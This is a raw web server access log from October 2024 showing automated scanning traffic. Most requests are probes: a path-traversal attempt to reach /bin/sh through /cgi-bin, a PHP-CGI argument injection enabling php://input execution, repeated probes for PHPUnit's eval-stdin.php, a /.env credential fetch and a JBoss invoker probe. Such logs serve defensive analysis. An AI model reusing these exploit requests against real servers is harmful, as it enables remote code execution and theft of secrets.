65.49.1.12 - - [08/Oct/2024:09:21:35 +0900] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/101.0.4951.41 Safari/537.36"
65.49.1.11 - - [08/Oct/2024:09:23:17 +0900] "GET /webui/ HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0"
111.167.228.133 - - [08/Oct/2024:09:25:09 +0900] "HEAD /invoker/EJBInvokerServlet HTTP/1.1" 404 0 "-" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17"
35.86.185.138 - - [08/Oct/2024:09:33:27 +0900] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; wpbot/1.1; +https://forms.gle/ajBaxygz9jSR8p8G9)"
35.86.185.138 - - [08/Oct/2024:09:33:28 +0900] "GET / HTTP/1.1" 200 409 "-" "Mozilla/5.0 (compatible; wpbot/1.1; +https://forms.gle/ajBaxygz9jSR8p8G9)"
135.125.244.48 - - [08/Oct/2024:10:04:30 +0900] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Oct/2024:10:04:31 +0900] "POST / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.199.117.131 - - [08/Oct/2024:10:14:43 +0900] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 166 "-" "-"
109.199.117.131 - - [08/Oct/2024:10:14:44 +0900] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 166 "-" "-"
109.199.117.131 - - [08/Oct/2024:10:14:44 +0900] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 179 "-" "Custom-AsyncHttpClient"
109.199.117.131 - - [08/Oct/2024:10:14:45 +0900] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "Custom-AsyncHttpClient"
109.199.117.131 - - [08/Oct/2024:10:14:45 +0900] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "Custom-AsyncHttpClient"
109.199.117.131 - - [08/Oct/2024:10:14:45 +0900] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "Custom-AsyncHttpClient"
109.199.117.131 - - [08/Oct/2024:10:14:46 +0900] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "Custom-AsyncHttpClient"
109.199.117.131 - - [08/Oct/2024:10:14:46 +0900] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 179 "-" "Custom-AsyncHttpClient"
109.199.117.131 - - [08/Oct/2024:10:14:48 +0900] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "Custom-AsyncHttpClient"
109.199.117.131 - - [08/Oct/2024:10:14:48 +0900] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "Custom-AsyncHttpClient"
109.199.117.131 - - [08/Oct/2024:10:14:49 +0900] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "Custom-AsyncHttpClient"
109.199.117.131 - - [08/Oct/2024:10:14:49 +0900] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "Custom-AsyncHttpClient"
109.199.117.131 - - [08/Oct/2024:10:14:50 +0900] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "Custom-AsyncHttpClient"
109.199.117.131 - - [08/Oct/2024:10:14:50 +0900] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "Custom-AsyncHttpClient"
109.199.117.131 - - [08/Oct/2024:10:14:51 +0900] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "Custom-AsyncHttpClient"
